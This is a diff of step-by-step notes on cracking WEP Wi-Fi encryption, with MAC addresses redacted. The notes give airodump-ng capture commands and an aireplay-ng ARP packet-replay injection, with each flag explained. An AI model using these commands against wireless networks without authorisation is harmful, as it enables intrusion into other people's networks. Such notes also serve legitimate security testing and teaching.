@@ -5,15 +5,15 @@ Step 2> Scan Network ==> Basic information
 	airodump-ng wlan0mon
 
 Step 3> Sniff packet
-	airodump-ng --bssid A0:65:18:1C:5A:C7 -c 11 -w WEPcrack wlan0mon
+	airodump-ng --bssid A0:...:C7 -c 11 -w WEPcrack wlan0mon
 
-		--bssid B8:55:10:CA:6E:FA: as MAC add of AP
+		--bssid B8:...:FA: as MAC add of AP
     		-c 11: Channel
     		-w WEPcrack: export WEPcrack.cap file ==> contain IVs
     		wlan0mon: Network card in monitor mode
 
 + Step 4> Inject ARP in AP, use Interactive Packet Replay
-	aireplay-ng -2 -b A0:65:18:1C:5A:C7 -h AA:84:5A:F4:CD:E7 -n 100 -p 0841 -c FF:FF:FF:FF:FF:FF wlan0mon
+	aireplay-ng -2 -b A0:...:C7 -h AA:...:E7 -n 100 -p 0841 -c FF:FF:FF:FF:FF:FF wlan0mon
 		
 		-2 : Interactive replay attack
 		-p 0841 : frame control	
